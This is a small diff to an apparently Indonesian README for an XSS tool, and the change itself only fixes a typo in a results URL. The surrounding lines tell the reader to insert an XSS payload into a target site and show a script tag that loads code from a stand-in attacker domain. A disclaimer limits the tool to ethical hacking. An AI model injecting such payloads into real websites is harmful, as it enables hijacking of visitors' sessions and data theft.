@@ -59,7 +59,7 @@ Sisipkan salah satu payload xss di web target .
 "><script src=http://yourdomain></script>
 ```
 #### To See Result :
-**yourdmain.com/cans/**
+**yourdomain.com/cans/**
 
 ## PERHATIAN !
 *Hanya untuk pembelajaran dan kegiatan Ethical Of Hacking, Hal negatif yang anda perbuat dengan tool ini diluar tanggung jawab author*
